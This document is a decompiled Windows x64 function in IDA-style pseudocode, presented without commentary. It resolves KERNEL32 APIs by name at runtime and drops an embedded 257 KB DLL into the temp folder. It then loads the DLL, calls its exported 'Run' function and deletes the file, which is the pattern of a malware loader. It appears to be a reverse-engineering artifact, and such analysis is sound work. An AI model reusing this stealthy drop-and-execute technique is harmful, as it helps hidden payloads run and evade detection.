__int64 __fastcall sub_129(
        unsigned int a1,
        __int64 a2,
        __int64 (__fastcall *a3)(char *),
        __int64 (__fastcall *a4)(__int64, char *),
        __int64 a5)
{
  __int64 result; // rax
  unsigned int v6; // [rsp+40h] [rbp-258h]
  __int64 v7; // [rsp+48h] [rbp-250h]
  char v8[16]; // [rsp+50h] [rbp-248h] BYREF
  char v9[16]; // [rsp+60h] [rbp-238h] BYREF
  char v10[16]; // [rsp+70h] [rbp-228h] BYREF
  char v11[16]; // [rsp+80h] [rbp-218h] BYREF
  char v12[16]; // [rsp+90h] [rbp-208h] BYREF
  char v13[16]; // [rsp+A0h] [rbp-1F8h] BYREF
  char v14[16]; // [rsp+B0h] [rbp-1E8h] BYREF
  char v15[16]; // [rsp+C0h] [rbp-1D8h] BYREF
  char v16[16]; // [rsp+D0h] [rbp-1C8h] BYREF
  char v17[16]; // [rsp+E0h] [rbp-1B8h] BYREF
  char v18[16]; // [rsp+F0h] [rbp-1A8h] BYREF
  __int64 v19; // [rsp+100h] [rbp-198h]
  __int64 v20; // [rsp+108h] [rbp-190h]
  int v21; // [rsp+110h] [rbp-188h] BYREF
  unsigned int v22; // [rsp+114h] [rbp-184h]
  __int64 (__fastcall *v23)(__int64); // [rsp+118h] [rbp-180h]
  void (__fastcall *v24)(__int64); // [rsp+120h] [rbp-178h]
  __int64 (__fastcall *v25)(__int64, int *); // [rsp+128h] [rbp-170h]
  void (__fastcall *v26)(__int64); // [rsp+130h] [rbp-168h]
  __int64 (__fastcall *v27)(int *, __int64, __int64, _QWORD, int, int, _QWORD); // [rsp+138h] [rbp-160h]
  unsigned int (__fastcall *v28)(__int64, void *, __int64, int *, _QWORD); // [rsp+140h] [rbp-158h]
  __int64 (__fastcall *v29)(int *); // [rsp+148h] [rbp-150h]
  void (__fastcall *v30)(_QWORD, __int64, __int64); // [rsp+150h] [rbp-148h]
  void (__fastcall *v31)(__int64); // [rsp+158h] [rbp-140h]
  void (__fastcall *v32)(__int64); // [rsp+160h] [rbp-138h]
  __int64 (__fastcall *v33)(int *); // [rsp+168h] [rbp-130h]
  int v34[74]; // [rsp+170h] [rbp-128h] BYREF

  strcpy(v15, "KERNEL32.dll");
  v7 = a3(v15);
  strcpy(v10, "CloseHandle");
  v24 = (void (__fastcall *)(__int64))a4(v7, v10);
  strcpy(v16, "GetTempPathA");
  v25 = (__int64 (__fastcall *)(__int64, int *))a4(v7, v16);
  v6 = v25(261i64, v34);
  *(int *)((char *)v34 + v6) = 1816347970;
  *(int *)((char *)&v34[1] + v6) = 1953391977;
  *(int *)((char *)&v34[2] + v6) = 1818504754;
  *((_BYTE *)&v34[3] + v6) = 108;
  *((_BYTE *)&v34[3] + v6 + 1) = 0;
  v19 = a3((char *)v34);
  if ( v19 )
  {
    strcpy(v11, "FreeLibrary");
    v26 = (void (__fastcall *)(__int64))a4(v7, v11);
    v26(v19);
  }
  strcpy(v12, "CreateFileA");
  v27 = (__int64 (__fastcall *)(int *, __int64, __int64, _QWORD, int, int, _QWORD))a4(v7, v12);
  result = v27(v34, 0x40000000i64, 7i64, 0i64, 2, -2147483520, 0i64);
  v20 = result;
  if ( result != -1 )
  {
    strcpy(v9, "WriteFile");
    v28 = (unsigned int (__fastcall *)(__int64, void *, __int64, int *, _QWORD))a4(v7, v9);
    if ( v28(v20, &unk_830, 257832i64, &v21, 0i64) && v21 == 257832 )
    {
      v24(v20);
      strcpy(&v8[4], "Sleep");
      v32 = (void (__fastcall *)(__int64))a4(v7, &v8[4]);
      strcpy(v17, "SetErrorMode");
      v23 = (__int64 (__fastcall *)(__int64))a4(v7, v17);
      v22 = v23(1i64);
      strcpy(v18, "LoadLibraryA");
      v29 = (__int64 (__fastcall *)(int *))a4(v7, v18);
      v19 = v29(v34);
      if ( v19 )
      {
        strcpy(v8, "Run");
        v30 = (void (__fastcall *)(_QWORD, __int64, __int64))a4(v19, v8);
        v30(a1, a2, a5);
        strcpy(v13, "FreeLibrary");
        v31 = (void (__fastcall *)(__int64))a4(v7, v13);
        v31(v19);
      }
      v23(v22);
      v32(1000i64);
    }
    else
    {
      v24(v20);
    }
    strcpy(v14, "DeleteFileA");
    v33 = (__int64 (__fastcall *)(int *))a4(v7, v14);
    return v33(v34);
  }
  return result;
}